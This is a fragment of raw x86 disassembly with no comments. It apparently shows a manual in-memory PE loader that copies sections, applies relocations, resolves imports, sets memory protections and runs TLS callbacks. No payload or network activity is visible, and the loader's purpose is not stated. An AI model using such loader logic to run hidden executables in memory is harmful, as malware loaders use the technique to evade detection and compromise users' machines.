  402ea6:	0f 83 37 0b 00 00    	jae    0x4039e3
  402eac:	8d 41 0f             	lea    0xf(%ecx),%eax
  402eaf:	39 d8                	cmp    %ebx,%eax
  402eb1:	0f 83 7a 0b 00 00    	jae    0x403a31
  402eb7:	8d 41 10             	lea    0x10(%ecx),%eax
  402eba:	39 d8                	cmp    %ebx,%eax
  402ebc:	0f 83 d6 09 00 00    	jae    0x403898
  402ec2:	8d 41 11             	lea    0x11(%ecx),%eax
  402ec5:	39 d8                	cmp    %ebx,%eax
  402ec7:	0f 83 37 0a 00 00    	jae    0x403904
  402ecd:	8d 41 12             	lea    0x12(%ecx),%eax
  402ed0:	39 d8                	cmp    %ebx,%eax
  402ed2:	0f 83 df 0b 00 00    	jae    0x403ab7
  402ed8:	8d 41 13             	lea    0x13(%ecx),%eax
  402edb:	39 d8                	cmp    %ebx,%eax
  402edd:	0f 83 ba 07 00 00    	jae    0x40369d
  402ee3:	8d 41 14             	lea    0x14(%ecx),%eax
  402ee6:	39 d8                	cmp    %ebx,%eax
  402ee8:	0f 83 cd 07 00 00    	jae    0x4036bb
  402eee:	8d 41 15             	lea    0x15(%ecx),%eax
  402ef1:	39 d8                	cmp    %ebx,%eax
  402ef3:	0f 83 10 08 00 00    	jae    0x403709
  402ef9:	8d 41 16             	lea    0x16(%ecx),%eax
  402efc:	39 d8                	cmp    %ebx,%eax
  402efe:	0f 83 56 08 00 00    	jae    0x40375a
  402f04:	8d 41 17             	lea    0x17(%ecx),%eax
  402f07:	39 d8                	cmp    %ebx,%eax
  402f09:	0f 83 99 08 00 00    	jae    0x4037a8
  402f0f:	8d 41 08             	lea    0x8(%ecx),%eax
  402f12:	39 d8                	cmp    %ebx,%eax
  402f14:	0f 83 df 08 00 00    	jae    0x4037f9
  402f1a:	8d 41 09             	lea    0x9(%ecx),%eax
  402f1d:	39 d8                	cmp    %ebx,%eax
  402f1f:	0f 83 22 09 00 00    	jae    0x403847
  402f25:	8d 51 0a             	lea    0xa(%ecx),%edx
  402f28:	39 da                	cmp    %ebx,%edx
  402f2a:	0f 83 f2 09 00 00    	jae    0x403922
  402f30:	8d 41 0b             	lea    0xb(%ecx),%eax
  402f33:	89 7e 2c             	mov    %edi,0x2c(%esi)
  402f36:	39 d8                	cmp    %ebx,%eax
  402f38:	89 46 0c             	mov    %eax,0xc(%esi)
  402f3b:	0f 83 4d 0a 00 00    	jae    0x40398e
  402f41:	8b 7e 34             	mov    0x34(%esi),%edi
  402f44:	0f b6 5c 0f 11       	movzbl 0x11(%edi,%ecx,1),%ebx
  402f49:	0f b6 44 0f 10       	movzbl 0x10(%edi,%ecx,1),%eax
  402f4e:	0f b6 14 17          	movzbl (%edi,%edx,1),%edx
  402f52:	c1 e3 08             	shl    $0x8,%ebx
  402f55:	c1 e2 10             	shl    $0x10,%edx
  402f58:	09 c3                	or     %eax,%ebx
  402f5a:	0f b6 44 0f 12       	movzbl 0x12(%edi,%ecx,1),%eax
  402f5f:	c1 e0 10             	shl    $0x10,%eax
  402f62:	09 c3                	or     %eax,%ebx
  402f64:	0f b6 44 0f 13       	movzbl 0x13(%edi,%ecx,1),%eax
  402f69:	c1 e0 18             	shl    $0x18,%eax
  402f6c:	09 c3                	or     %eax,%ebx
  402f6e:	0f b6 44 0f 09       	movzbl 0x9(%edi,%ecx,1),%eax
  402f73:	89 5e 58             	mov    %ebx,0x58(%esi)
  402f76:	0f b6 5c 0f 08       	movzbl 0x8(%edi,%ecx,1),%ebx
  402f7b:	c1 e0 08             	shl    $0x8,%eax
  402f7e:	09 d8                	or     %ebx,%eax
  402f80:	89 fb                	mov    %edi,%ebx
  402f82:	09 d0                	or     %edx,%eax
  402f84:	0f b6 54 0f 16       	movzbl 0x16(%edi,%ecx,1),%edx
  402f89:	89 56 04             	mov    %edx,0x4(%esi)
  402f8c:	8b 56 0c             	mov    0xc(%esi),%edx
  402f8f:	89 4e 0c             	mov    %ecx,0xc(%esi)
  402f92:	c1 66 04 10          	shll   $0x10,0x4(%esi)
  402f96:	0f b6 14 17          	movzbl (%edi,%edx,1),%edx
  402f9a:	0f b6 7c 0f 17       	movzbl 0x17(%edi,%ecx,1),%edi
  402f9f:	c1 e2 18             	shl    $0x18,%edx
  402fa2:	c1 e7 18             	shl    $0x18,%edi
  402fa5:	09 d0                	or     %edx,%eax
  402fa7:	0f b6 54 0b 15       	movzbl 0x15(%ebx,%ecx,1),%edx
  402fac:	0f b6 4c 0b 14       	movzbl 0x14(%ebx,%ecx,1),%ecx
  402fb1:	89 7e 54             	mov    %edi,0x54(%esi)
  402fb4:	c1 e2 08             	shl    $0x8,%edx
  402fb7:	89 8e b4 00 00 00    	mov    %ecx,0xb4(%esi)
  402fbd:	8d 1c 0a             	lea    (%edx,%ecx,1),%ebx
  402fc0:	8b 4e 58             	mov    0x58(%esi),%ecx
  402fc3:	03 5e 04             	add    0x4(%esi),%ebx
  402fc6:	09 fb                	or     %edi,%ebx
  402fc8:	8b 7e 18             	mov    0x18(%esi),%edi
  402fcb:	39 c8                	cmp    %ecx,%eax
  402fcd:	0f 43 c1             	cmovae %ecx,%eax
  402fd0:	b9 00 00 00 00       	mov    $0x0,%ecx
  402fd5:	29 df                	sub    %ebx,%edi
  402fd7:	0f 42 f9             	cmovb  %ecx,%edi
  402fda:	39 c7                	cmp    %eax,%edi
  402fdc:	0f 43 f8             	cmovae %eax,%edi
  402fdf:	01 fb                	add    %edi,%ebx
  402fe1:	3b 5e 18             	cmp    0x18(%esi),%ebx
  402fe4:	77 58                	ja     0x40303e
  402fe6:	85 ff                	test   %edi,%edi
  402fe8:	74 54                	je     0x40303e
  402fea:	8b 4e 34             	mov    0x34(%esi),%ecx
  402fed:	8b 46 0c             	mov    0xc(%esi),%eax
  402ff0:	8b 5e 0c             	mov    0xc(%esi),%ebx
  402ff3:	03 96 b4 00 00 00    	add    0xb4(%esi),%edx
  402ff9:	0f b6 44 01 0d       	movzbl 0xd(%ecx,%eax,1),%eax
  402ffe:	0f b6 5c 19 0c       	movzbl 0xc(%ecx,%ebx,1),%ebx
  403003:	c1 e0 08             	shl    $0x8,%eax
  403006:	09 d8                	or     %ebx,%eax
  403008:	8b 5e 0c             	mov    0xc(%esi),%ebx
  40300b:	0f b6 5c 19 0e       	movzbl 0xe(%ecx,%ebx,1),%ebx
  403010:	c1 e3 10             	shl    $0x10,%ebx
  403013:	09 d8                	or     %ebx,%eax
  403015:	89 cb                	mov    %ecx,%ebx
  403017:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40301a:	0f b6 4c 0b 0f       	movzbl 0xf(%ebx,%ecx,1),%ecx
  40301f:	c1 e1 18             	shl    $0x18,%ecx
  403022:	09 c8                	or     %ecx,%eax
  403024:	8b 4e 54             	mov    0x54(%esi),%ecx
  403027:	03 46 08             	add    0x8(%esi),%eax
  40302a:	03 4e 04             	add    0x4(%esi),%ecx
  40302d:	01 ca                	add    %ecx,%edx
  40302f:	31 c9                	xor    %ecx,%ecx
  403031:	01 da                	add    %ebx,%edx
  403033:	8a 1c 0a             	mov    (%edx,%ecx,1),%bl
  403036:	88 1c 08             	mov    %bl,(%eax,%ecx,1)
  403039:	41                   	inc    %ecx
  40303a:	39 cf                	cmp    %ecx,%edi
  40303c:	75 f5                	jne    0x403033
  40303e:	8b 7e 2c             	mov    0x2c(%esi),%edi
  403041:	8b 5e 18             	mov    0x18(%esi),%ebx
  403044:	8b 56 50             	mov    0x50(%esi),%edx
  403047:	47                   	inc    %edi
  403048:	3b be 90 00 00 00    	cmp    0x90(%esi),%edi
  40304e:	0f 85 25 fe ff ff    	jne    0x402e79
  403054:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  40305b:	00 00 00 
  40305e:	6a 0c                	push   $0xc
  403060:	68 50 d7 42 00       	push   $0x42d750
  403065:	e8 96 df ff ff       	call   0x401000
  40306a:	83 c4 08             	add    $0x8,%esp
  40306d:	8b 8e ac 00 00 00    	mov    0xac(%esi),%ecx
  403073:	0f b6 46 33          	movzbl 0x33(%esi),%eax
  403077:	8b 7e 14             	mov    0x14(%esi),%edi
  40307a:	c1 e1 08             	shl    $0x8,%ecx
  40307d:	c1 e7 18             	shl    $0x18,%edi
  403080:	09 c8                	or     %ecx,%eax
  403082:	8b 8e b0 00 00 00    	mov    0xb0(%esi),%ecx
  403088:	c1 e1 10             	shl    $0x10,%ecx
  40308b:	09 c1                	or     %eax,%ecx
  40308d:	09 cf                	or     %ecx,%edi
  40308f:	8b 4e 08             	mov    0x8(%esi),%ecx
  403092:	85 ff                	test   %edi,%edi
  403094:	0f 84 8d 00 00 00    	je     0x403127
  40309a:	3b 4e 70             	cmp    0x70(%esi),%ecx
  40309d:	0f 84 84 00 00 00    	je     0x403127
  4030a3:	8d 47 08             	lea    0x8(%edi),%eax
  4030a6:	3b 46 48             	cmp    0x48(%esi),%eax
  4030a9:	77 7c                	ja     0x403127
  4030ab:	89 c8                	mov    %ecx,%eax
  4030ad:	8d 51 08             	lea    0x8(%ecx),%edx
  4030b0:	2b 46 70             	sub    0x70(%esi),%eax
  4030b3:	89 56 2c             	mov    %edx,0x2c(%esi)
  4030b6:	89 46 04             	mov    %eax,0x4(%esi)
  4030b9:	8b 14 0f             	mov    (%edi,%ecx,1),%edx
  4030bc:	85 d2                	test   %edx,%edx
  4030be:	74 67                	je     0x403127
  4030c0:	8b 44 0f 04          	mov    0x4(%edi,%ecx,1),%eax
  4030c4:	83 f8 08             	cmp    $0x8,%eax
  4030c7:	72 5e                	jb     0x403127
  4030c9:	8d 58 f8             	lea    -0x8(%eax),%ebx
  4030cc:	89 7e 14             	mov    %edi,0x14(%esi)
  4030cf:	89 46 0c             	mov    %eax,0xc(%esi)
  4030d2:	83 fb 02             	cmp    $0x2,%ebx
  4030d5:	72 3b                	jb     0x403112
  4030d7:	8b 46 14             	mov    0x14(%esi),%eax
  4030da:	8b 4e 2c             	mov    0x2c(%esi),%ecx
  4030dd:	03 56 08             	add    0x8(%esi),%edx
  4030e0:	d1 eb                	shr    $1,%ebx
  4030e2:	01 c1                	add    %eax,%ecx
  4030e4:	0f b7 39             	movzwl (%ecx),%edi
  4030e7:	89 f8                	mov    %edi,%eax
  4030e9:	c1 e8 0c             	shr    $0xc,%eax
  4030ec:	80 7e 44 00          	cmpb   $0x0,0x44(%esi)
  4030f0:	74 08                	je     0x4030fa
  4030f2:	66 83 f8 0a          	cmp    $0xa,%ax
  4030f6:	74 08                	je     0x403100
  4030f8:	eb 12                	jmp    0x40310c
  4030fa:	66 83 f8 03          	cmp    $0x3,%ax
  4030fe:	75 0c                	jne    0x40310c
  403100:	8b 46 04             	mov    0x4(%esi),%eax
  403103:	81 e7 ff 0f 00 00    	and    $0xfff,%edi
  403109:	01 04 3a             	add    %eax,(%edx,%edi,1)
  40310c:	83 c1 02             	add    $0x2,%ecx
  40310f:	4b                   	dec    %ebx
  403110:	75 d2                	jne    0x4030e4
  403112:	8b 4e 14             	mov    0x14(%esi),%ecx
  403115:	8b 56 0c             	mov    0xc(%esi),%edx
  403118:	8d 44 0a 08          	lea    0x8(%edx,%ecx,1),%eax
  40311c:	8d 3c 0a             	lea    (%edx,%ecx,1),%edi
  40311f:	8b 4e 08             	mov    0x8(%esi),%ecx
  403122:	3b 46 48             	cmp    0x48(%esi),%eax
  403125:	76 92                	jbe    0x4030b9
  403127:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  40312e:	00 00 00 
  403131:	6a 0a                	push   $0xa
  403133:	68 5c d7 42 00       	push   $0x42d75c
  403138:	e8 c3 de ff ff       	call   0x401000
  40313d:	83 c4 08             	add    $0x8,%esp
  403140:	8b 4e 74             	mov    0x74(%esi),%ecx
  403143:	8b 56 08             	mov    0x8(%esi),%edx
  403146:	85 c9                	test   %ecx,%ecx
  403148:	0f 84 07 01 00 00    	je     0x403255
  40314e:	8d 41 14             	lea    0x14(%ecx),%eax
  403151:	3b 46 48             	cmp    0x48(%esi),%eax
  403154:	0f 87 fb 00 00 00    	ja     0x403255
  40315a:	8d 7a 02             	lea    0x2(%edx),%edi
  40315d:	89 7e 54             	mov    %edi,0x54(%esi)
  403160:	89 c7                	mov    %eax,%edi
  403162:	8b 44 11 0c          	mov    0xc(%ecx,%edx,1),%eax
  403166:	85 c0                	test   %eax,%eax
  403168:	0f 84 e7 00 00 00    	je     0x403255
  40316e:	89 7e 74             	mov    %edi,0x74(%esi)
  403171:	8b 3c 11             	mov    (%ecx,%edx,1),%edi
  403174:	8b 5c 11 10          	mov    0x10(%ecx,%edx,1),%ebx
  403178:	01 d0                	add    %edx,%eax
  40317a:	50                   	push   %eax
  40317b:	ff 56 7c             	call   *0x7c(%esi)
  40317e:	85 c0                	test   %eax,%eax
  403180:	89 46 58             	mov    %eax,0x58(%esi)
  403183:	0f 84 ba 00 00 00    	je     0x403243
  403189:	8b 46 08             	mov    0x8(%esi),%eax
  40318c:	89 f9                	mov    %edi,%ecx
  40318e:	85 ff                	test   %edi,%edi
  403190:	89 da                	mov    %ebx,%edx
  403192:	0f 44 cb             	cmove  %ebx,%ecx
  403195:	8d 59 04             	lea    0x4(%ecx),%ebx
  403198:	8d 3c 01             	lea    (%ecx,%eax,1),%edi
  40319b:	01 c2                	add    %eax,%edx
  40319d:	89 d8                	mov    %ebx,%eax
  40319f:	83 c1 08             	add    $0x8,%ecx
  4031a2:	89 7e 14             	mov    %edi,0x14(%esi)
  4031a5:	89 7e 2c             	mov    %edi,0x2c(%esi)
  4031a8:	89 56 0c             	mov    %edx,0xc(%esi)
  4031ab:	80 7e 44 00          	cmpb   $0x0,0x44(%esi)
  4031af:	89 56 04             	mov    %edx,0x4(%esi)
  4031b2:	74 40                	je     0x4031f4
  4031b4:	3b 4e 48             	cmp    0x48(%esi),%ecx
  4031b7:	0f 87 86 00 00 00    	ja     0x403243
  4031bd:	89 cb                	mov    %ecx,%ebx
  4031bf:	8b 4e 2c             	mov    0x2c(%esi),%ecx
  4031c2:	89 c7                	mov    %eax,%edi
  4031c4:	8b 01                	mov    (%ecx),%eax
  4031c6:	8b 49 04             	mov    0x4(%ecx),%ecx
  4031c9:	89 c2                	mov    %eax,%edx
  4031cb:	09 ca                	or     %ecx,%edx
  4031cd:	74 74                	je     0x403243
  4031cf:	0f b7 d0             	movzwl %ax,%edx
  4031d2:	03 46 54             	add    0x54(%esi),%eax
  4031d5:	85 c9                	test   %ecx,%ecx
  4031d7:	0f 48 c2             	cmovs  %edx,%eax
  4031da:	50                   	push   %eax
  4031db:	ff 76 58             	push   0x58(%esi)
  4031de:	ff 56 78             	call   *0x78(%esi)
  4031e1:	8b 4e 0c             	mov    0xc(%esi),%ecx
  4031e4:	8b 56 04             	mov    0x4(%esi),%edx
  4031e7:	89 01                	mov    %eax,(%ecx)
  4031e9:	89 c8                	mov    %ecx,%eax
  4031eb:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  4031f2:	eb 2f                	jmp    0x403223
  4031f4:	3b 46 48             	cmp    0x48(%esi),%eax
  4031f7:	77 4a                	ja     0x403243
  4031f9:	89 c7                	mov    %eax,%edi
  4031fb:	8b 46 14             	mov    0x14(%esi),%eax
  4031fe:	8b 00                	mov    (%eax),%eax
  403200:	85 c0                	test   %eax,%eax
  403202:	74 3f                	je     0x403243
  403204:	8b 56 54             	mov    0x54(%esi),%edx
  403207:	89 cb                	mov    %ecx,%ebx
  403209:	0f b7 c8             	movzwl %ax,%ecx
  40320c:	85 c0                	test   %eax,%eax
  40320e:	8d 14 10             	lea    (%eax,%edx,1),%edx
  403211:	0f 48 d1             	cmovs  %ecx,%edx
  403214:	52                   	push   %edx
  403215:	ff 76 58             	push   0x58(%esi)
  403218:	ff 56 78             	call   *0x78(%esi)
  40321b:	8b 56 04             	mov    0x4(%esi),%edx
  40321e:	89 02                	mov    %eax,(%edx)
  403220:	8b 46 0c             	mov    0xc(%esi),%eax
  403223:	83 46 2c 08          	addl   $0x8,0x2c(%esi)
  403227:	83 46 14 04          	addl   $0x4,0x14(%esi)
  40322b:	83 c0 08             	add    $0x8,%eax
  40322e:	89 d9                	mov    %ebx,%ecx
  403230:	83 c2 04             	add    $0x4,%edx
  403233:	89 46 0c             	mov    %eax,0xc(%esi)
  403236:	89 f8                	mov    %edi,%eax
  403238:	83 c1 08             	add    $0x8,%ecx
  40323b:	83 c0 04             	add    $0x4,%eax
  40323e:	e9 68 ff ff ff       	jmp    0x4031ab
  403243:	8b 4e 74             	mov    0x74(%esi),%ecx
  403246:	8b 56 08             	mov    0x8(%esi),%edx
  403249:	8d 41 14             	lea    0x14(%ecx),%eax
  40324c:	3b 46 48             	cmp    0x48(%esi),%eax
  40324f:	0f 86 0b ff ff ff    	jbe    0x403160
  403255:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  40325c:	00 00 00 
  40325f:	6a 0b                	push   $0xb
  403261:	68 66 d7 42 00       	push   $0x42d766
  403266:	e8 95 dd ff ff       	call   0x401000
  40326b:	83 c4 08             	add    $0x8,%esp
  40326e:	8b 86 90 00 00 00    	mov    0x90(%esi),%eax
  403274:	85 c0                	test   %eax,%eax
  403276:	0f 84 93 01 00 00    	je     0x40340f
  40327c:	8b 4e 50             	mov    0x50(%esi),%ecx
  40327f:	8d 04 80             	lea    (%eax,%eax,4),%eax
  403282:	31 db                	xor    %ebx,%ebx
  403284:	8d 04 c1             	lea    (%ecx,%eax,8),%eax
  403287:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  40328a:	89 46 7c             	mov    %eax,0x7c(%esi)
  40328d:	8b 46 4c             	mov    0x4c(%esi),%eax
  403290:	8d 14 08             	lea    (%eax,%ecx,1),%edx
  403293:	8b 8e 9c 00 00 00    	mov    0x9c(%esi),%ecx
  403299:	8b 86 98 00 00 00    	mov    0x98(%esi),%eax
  40329f:	03 56 24             	add    0x24(%esi),%edx
  4032a2:	8d 0c 89             	lea    (%ecx,%ecx,4),%ecx
  4032a5:	8d 04 80             	lea    (%eax,%eax,4),%eax
  4032a8:	c1 e1 0b             	shl    $0xb,%ecx
  4032ab:	03 56 20             	add    0x20(%esi),%edx
  4032ae:	8d 04 c1             	lea    (%ecx,%eax,8),%eax
  4032b1:	89 46 78             	mov    %eax,0x78(%esi)
  4032b4:	8b 46 34             	mov    0x34(%esi),%eax
  4032b7:	89 56 0c             	mov    %edx,0xc(%esi)
  4032ba:	8d 44 10 20          	lea    0x20(%eax,%edx,1),%eax
  4032be:	89 46 14             	mov    %eax,0x14(%esi)
  4032c1:	8d 44 1a 40          	lea    0x40(%edx,%ebx,1),%eax
  4032c5:	3b 46 7c             	cmp    0x7c(%esi),%eax
  4032c8:	0f 87 41 01 00 00    	ja     0x40340f
  4032ce:	8b 4e 18             	mov    0x18(%esi),%ecx
  4032d1:	8d 44 1a 24          	lea    0x24(%edx,%ebx,1),%eax
  4032d5:	39 c8                	cmp    %ecx,%eax
  4032d7:	0f 83 fc 03 00 00    	jae    0x4036d9
  4032dd:	8d 44 1a 25          	lea    0x25(%edx,%ebx,1),%eax
  4032e1:	39 c8                	cmp    %ecx,%eax
  4032e3:	0f 83 3e 04 00 00    	jae    0x403727
  4032e9:	8d 44 1a 26          	lea    0x26(%edx,%ebx,1),%eax
  4032ed:	39 c8                	cmp    %ecx,%eax
  4032ef:	0f 83 83 04 00 00    	jae    0x403778
  4032f5:	8d 44 1a 27          	lea    0x27(%edx,%ebx,1),%eax
  4032f9:	39 c8                	cmp    %ecx,%eax
  4032fb:	0f 83 c5 04 00 00    	jae    0x4037c6
  403301:	8d 44 1a 20          	lea    0x20(%edx,%ebx,1),%eax
  403305:	39 c8                	cmp    %ecx,%eax
  403307:	0f 83 0a 05 00 00    	jae    0x403817
  40330d:	8d 44 1a 21          	lea    0x21(%edx,%ebx,1),%eax
  403311:	39 c8                	cmp    %ecx,%eax
  403313:	0f 83 4c 05 00 00    	jae    0x403865
  403319:	8d 44 1a 22          	lea    0x22(%edx,%ebx,1),%eax
  40331d:	39 c8                	cmp    %ecx,%eax
  40331f:	0f 83 1b 06 00 00    	jae    0x403940
  403325:	8d 44 1a 23          	lea    0x23(%edx,%ebx,1),%eax
  403329:	39 c8                	cmp    %ecx,%eax
  40332b:	0f 83 7f 06 00 00    	jae    0x4039b0
  403331:	8d 44 1a 3c          	lea    0x3c(%edx,%ebx,1),%eax
  403335:	39 c8                	cmp    %ecx,%eax
  403337:	0f 83 c4 06 00 00    	jae    0x403a01
  40333d:	8d 44 1a 3d          	lea    0x3d(%edx,%ebx,1),%eax
  403341:	39 c8                	cmp    %ecx,%eax
  403343:	0f 83 06 07 00 00    	jae    0x403a4f
  403349:	8d 44 1a 3e          	lea    0x3e(%edx,%ebx,1),%eax
  40334d:	39 c8                	cmp    %ecx,%eax
  40334f:	0f 83 61 05 00 00    	jae    0x4038b6
  403355:	8d 44 1a 3f          	lea    0x3f(%edx,%ebx,1),%eax
  403359:	39 c8                	cmp    %ecx,%eax
  40335b:	0f 83 21 07 00 00    	jae    0x403a82
  403361:	89 5e 04             	mov    %ebx,0x4(%esi)
  403364:	8b 7e 14             	mov    0x14(%esi),%edi
  403367:	8b 4e 04             	mov    0x4(%esi),%ecx
  40336a:	0f b6 44 1f 05       	movzbl 0x5(%edi,%ebx,1),%eax
  40336f:	0f b6 54 1f 04       	movzbl 0x4(%edi,%ebx,1),%edx
  403374:	0f b6 5c 0f 06       	movzbl 0x6(%edi,%ecx,1),%ebx
  403379:	8b 4e 04             	mov    0x4(%esi),%ecx
  40337c:	c1 e0 08             	shl    $0x8,%eax
  40337f:	0f b6 4c 0f 07       	movzbl 0x7(%edi,%ecx,1),%ecx
  403384:	09 d0                	or     %edx,%eax
  403386:	c1 e3 10             	shl    $0x10,%ebx
  403389:	8b 56 04             	mov    0x4(%esi),%edx
  40338c:	09 d8                	or     %ebx,%eax
  40338e:	c1 e1 18             	shl    $0x18,%ecx
  403391:	0f b6 54 17 02       	movzbl 0x2(%edi,%edx,1),%edx
  403396:	09 c8                	or     %ecx,%eax
  403398:	8b 4e 04             	mov    0x4(%esi),%ecx
  40339b:	c1 e2 10             	shl    $0x10,%edx
  40339e:	0f b6 1c 0f          	movzbl (%edi,%ecx,1),%ebx
  4033a2:	8b 4e 04             	mov    0x4(%esi),%ecx
  4033a5:	0f b6 4c 0f 01       	movzbl 0x1(%edi,%ecx,1),%ecx
  4033aa:	c1 e1 08             	shl    $0x8,%ecx
  4033ad:	09 d9                	or     %ebx,%ecx
  4033af:	8b 5e 04             	mov    0x4(%esi),%ebx
  4033b2:	09 d1                	or     %edx,%ecx
  4033b4:	8b 56 04             	mov    0x4(%esi),%edx
  4033b7:	0f b6 5c 1f 03       	movzbl 0x3(%edi,%ebx,1),%ebx
  4033bc:	c1 e3 18             	shl    $0x18,%ebx
  4033bf:	09 d9                	or     %ebx,%ecx
  4033c1:	8a 5c 17 1f          	mov    0x1f(%edi,%edx,1),%bl
  4033c5:	c7 86 e0 04 00 00 00 	movl   $0x0,0x4e0(%esi)
  4033cc:	00 00 00 
  4033cf:	89 da                	mov    %ebx,%edx
  4033d1:	c0 ea 07             	shr    $0x7,%dl
  4033d4:	0f b6 d2             	movzbl %dl,%edx
  4033d7:	8d 7c 12 02          	lea    0x2(%edx,%edx,1),%edi
  4033db:	c1 e2 05             	shl    $0x5,%edx
  4033de:	83 c2 20             	add    $0x20,%edx
  4033e1:	f6 c3 20             	test   $0x20,%bl
  4033e4:	8d 9e e0 04 00 00    	lea    0x4e0(%esi),%ebx
  4033ea:	0f 44 d7             	cmove  %edi,%edx
  4033ed:	03 46 08             	add    0x8(%esi),%eax
  4033f0:	83 f9 01             	cmp    $0x1,%ecx
  4033f3:	83 d1 00             	adc    $0x0,%ecx
  4033f6:	53                   	push   %ebx
  4033f7:	8b 5e 04             	mov    0x4(%esi),%ebx
  4033fa:	52                   	push   %edx
  4033fb:	51                   	push   %ecx
  4033fc:	50                   	push   %eax
  4033fd:	ff 56 28             	call   *0x28(%esi)
  403400:	83 c3 28             	add    $0x28,%ebx
  403403:	8b 56 0c             	mov    0xc(%esi),%edx
  403406:	39 5e 78             	cmp    %ebx,0x78(%esi)
  403409:	0f 85 b2 fe ff ff    	jne    0x4032c1
  40340f:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403416:	00 00 00 
  403419:	6a 0a                	push   $0xa
  40341b:	68 34 d8 42 00       	push   $0x42d834
  403420:	e8 db db ff ff       	call   0x401000
  403425:	83 c4 08             	add    $0x8,%esp
  403428:	80 7e 44 00          	cmpb   $0x0,0x44(%esi)
  40342c:	74 71                	je     0x40349f
  40342e:	8b 9e 8c 00 00 00    	mov    0x8c(%esi),%ebx
  403434:	8b 56 18             	mov    0x18(%esi),%edx
  403437:	8d 83 d8 00 00 00    	lea    0xd8(%ebx),%eax
  40343d:	39 d0                	cmp    %edx,%eax
  40343f:	0f 87 09 01 00 00    	ja     0x40354e
  403445:	8d 83 d0 00 00 00    	lea    0xd0(%ebx),%eax
  40344b:	39 d0                	cmp    %edx,%eax
  40344d:	0f 83 38 0b 00 00    	jae    0x403f8b
  403453:	8d bb d1 00 00 00    	lea    0xd1(%ebx),%edi
  403459:	39 d7                	cmp    %edx,%edi
  40345b:	0f 83 3b 0b 00 00    	jae    0x403f9c
  403461:	8d 8b d2 00 00 00    	lea    0xd2(%ebx),%ecx
  403467:	89 d0                	mov    %edx,%eax
  403469:	39 d1                	cmp    %edx,%ecx
  40346b:	0f 83 3c 0b 00 00    	jae    0x403fad
  403471:	8d 93 d3 00 00 00    	lea    0xd3(%ebx),%edx
  403477:	39 c2                	cmp    %eax,%edx
  403479:	0f 83 b7 0a 00 00    	jae    0x403f36
  40347f:	8b 46 34             	mov    0x34(%esi),%eax
  403482:	8a 9c 18 d0 00 00 00 	mov    0xd0(%eax,%ebx,1),%bl
  403489:	eb 6f                	jmp    0x4034fa
  40348b:	6a 0f                	push   $0xf
  40348d:	68 db d8 42 00       	push   $0x42d8db
  403492:	e8 69 db ff ff       	call   0x401000
  403497:	83 c4 08             	add    $0x8,%esp
  40349a:	e9 5a f3 ff ff       	jmp    0x4027f9
  40349f:	8b 9e 8c 00 00 00    	mov    0x8c(%esi),%ebx
  4034a5:	8b 56 18             	mov    0x18(%esi),%edx
  4034a8:	8d 83 c8 00 00 00    	lea    0xc8(%ebx),%eax
  4034ae:	39 d0                	cmp    %edx,%eax
  4034b0:	0f 87 98 00 00 00    	ja     0x40354e
  4034b6:	8d 83 c0 00 00 00    	lea    0xc0(%ebx),%eax
  4034bc:	39 d0                	cmp    %edx,%eax
  4034be:	0f 83 83 0a 00 00    	jae    0x403f47
  4034c4:	8d bb c1 00 00 00    	lea    0xc1(%ebx),%edi
  4034ca:	39 d7                	cmp    %edx,%edi
  4034cc:	0f 83 86 0a 00 00    	jae    0x403f58
  4034d2:	8d 8b c2 00 00 00    	lea    0xc2(%ebx),%ecx
  4034d8:	89 d0                	mov    %edx,%eax
  4034da:	39 d1                	cmp    %edx,%ecx
  4034dc:	0f 83 87 0a 00 00    	jae    0x403f69
  4034e2:	8d 93 c3 00 00 00    	lea    0xc3(%ebx),%edx
  4034e8:	39 c2                	cmp    %eax,%edx
  4034ea:	0f 83 8a 0a 00 00    	jae    0x403f7a
  4034f0:	8b 46 34             	mov    0x34(%esi),%eax
  4034f3:	8a 9c 18 c0 00 00 00 	mov    0xc0(%eax,%ebx,1),%bl
  4034fa:	88 5e 04             	mov    %bl,0x4(%esi)
  4034fd:	0f b6 1c 38          	movzbl (%eax,%edi,1),%ebx
  403501:	0f b6 3c 08          	movzbl (%eax,%ecx,1),%edi
  403505:	0f b6 0c 10          	movzbl (%eax,%edx,1),%ecx
  403509:	0f b6 46 04          	movzbl 0x4(%esi),%eax
  40350d:	c1 e3 08             	shl    $0x8,%ebx
  403510:	c1 e7 10             	shl    $0x10,%edi
  403513:	c1 e1 18             	shl    $0x18,%ecx
  403516:	09 d8                	or     %ebx,%eax
  403518:	8b 5e 08             	mov    0x8(%esi),%ebx
  40351b:	09 f8                	or     %edi,%eax
  40351d:	09 c8                	or     %ecx,%eax
  40351f:	74 2d                	je     0x40354e
  403521:	80 7e 44 00          	cmpb   $0x0,0x44(%esi)
  403525:	8d 4b 0c             	lea    0xc(%ebx),%ecx
  403528:	8d 53 18             	lea    0x18(%ebx),%edx
  40352b:	0f 45 ca             	cmovne %edx,%ecx
  40352e:	8b 3c 01             	mov    (%ecx,%eax,1),%edi
  403531:	85 ff                	test   %edi,%edi
  403533:	74 19                	je     0x40354e
  403535:	8b 07                	mov    (%edi),%eax
  403537:	85 c0                	test   %eax,%eax
  403539:	74 13                	je     0x40354e
  40353b:	83 c7 04             	add    $0x4,%edi
  40353e:	6a 00                	push   $0x0
  403540:	6a 01                	push   $0x1
  403542:	53                   	push   %ebx
  403543:	ff d0                	call   *%eax
  403545:	8b 07                	mov    (%edi),%eax
  403547:	83 c7 04             	add    $0x4,%edi
  40354a:	85 c0                	test   %eax,%eax
  40354c:	75 f0                	jne    0x40353e
  40354e:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403555:	00 00 00 
  403558:	6a 0b                	push   $0xb
  40355a:	68 c0 d8 42 00       	push   $0x42d8c0
  40355f:	e8 9c da ff ff       	call   0x401000
  403564:	83 c4 08             	add    $0x8,%esp
  403567:	e9 94 f2 ff ff       	jmp    0x402800
  40356c:	6a 10                	push   $0x10
  40356e:	68 cb d8 42 00       	push   $0x42d8cb
  403573:	e8 88 da ff ff       	call   0x401000
  403578:	83 c4 08             	add    $0x8,%esp
  40357b:	e9 79 f2 ff ff       	jmp    0x4027f9
  403580:	8d 4e 60             	lea    0x60(%esi),%ecx
